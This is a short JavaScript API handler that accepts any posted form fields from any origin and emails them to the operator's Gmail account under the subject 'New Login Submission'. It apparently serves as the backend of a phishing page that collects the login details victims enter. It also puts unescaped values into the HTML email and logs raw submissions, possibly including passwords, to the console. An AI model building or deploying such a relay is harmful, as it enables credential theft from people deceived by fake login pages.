import nodemailer from 'nodemailer';
import Cors from 'cors';

// Initialize CORS middleware
const cors = Cors({
  origin: process.env.FRONTEND_URL || '*', // Restrict to frontend URL in production
  methods: ['GET', 'HEAD', 'POST', 'OPTIONS'],
});

// Helper to run middleware
function runMiddleware(req, res, fn) {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
}

// Helper to sanitize and format object for email
function sanitizeObject(obj) {
  if (typeof obj !== 'object' || obj === null) return '';
  return Object.entries(obj).reduce((acc, [key, value]) => {
    const sanitizedValue = typeof value === 'string' ? value.trim().replace(/[\r\n\s]+/g, ' ') : value;
    acc[key] = sanitizedValue;
    return acc;
  }, {});
}

export default async function handler(req, res) {
  // Run CORS middleware
  await runMiddleware(req, res, cors);

  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const body = req.body || {};
  console.log('Received req.body:', body); // Debug payload

  // Sanitize the entire req.body object
  const sanitizedBody = sanitizeObject(body);

  // Validate that req.body is not empty
  if (Object.keys(sanitizedBody).length === 0) {
    return res.status(400).json({ message: 'Request body is empty' });
  }

  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Format req.body for email
    const textContent = Object.entries(sanitizedBody)
      .map(([key, value]) => `${key}: ${value}`)
      .join('\n');
    const htmlContent = Object.entries(sanitizedBody)
      .map(([key, value]) => `<div style="white-space: nowrap;"><strong>${key}:</strong> ${value}</div>`)
      .join('');

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: 'New Login Submission',
      text: `New submission details:\n${textContent}`,
      html: `<h3>New Submission</h3>${htmlContent}`,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: 'Submission details sent successfully' });
  } catch (error) {
    console.error('Error sending email:', error);
    return res.status(500).json({ message: 'Failed to send email', error: error.message });
  }
}
